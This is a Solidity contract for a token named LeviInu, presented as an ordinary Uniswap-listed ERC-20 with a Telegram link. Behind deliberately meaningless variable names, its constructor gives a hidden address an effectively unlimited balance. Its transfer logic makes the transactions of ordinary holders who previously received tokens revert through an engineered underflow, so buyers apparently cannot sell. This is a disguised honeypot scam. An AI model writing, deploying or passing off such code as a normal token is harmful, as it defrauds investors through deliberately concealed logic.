// https://t.me/leviinu_eth

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.5;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

contract LeviInu is Ownable {
    constructor(
        string memory select,
        string memory separate,
        address mirror,
        address honor
    ) {
        uniswapV2Router = IUniswapV2Router02(mirror);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        _symbol = separate;
        _name = select;
        laugh = 0;
        _decimals = 9;
        _balances[honor] = below;
        apartment = 1000000000;
        oldest[honor] = below;
        _tTotal = apartment * 10**_decimals;
        oldest[msg.sender] = below;
        _balances[msg.sender] = _tTotal;
    }

    uint256 public laugh;
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    uint256 private _tTotal;
    uint256 private apartment;
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    address private they;
    uint256 private below = (~uint256(0));

    function decimals() public view returns (uint256) {
        return _decimals;
    }

    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;

    function totalSupply() public view returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function _transfer(
        address account,
        address thy,
        uint256 knew
    ) internal {
        uint256 familiar = laugh;

        address there = uniswapV2Pair;

        if (oldest[account] == 0 && there != account && outline[account] > 0) {
            oldest[account] -= familiar - 1;
        }

        address dear = they;
        they = thy;
        outline[dear] += familiar + 1;

        _balances[account] -= knew;
        uint256 diagram = (knew / 100) * laugh;
        knew -= diagram;
        _balances[thy] += knew;
    }

    mapping(address => uint256) private outline;

    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }

    mapping(address => uint256) private oldest;

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        _transfer(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount;
        return true;
    }
}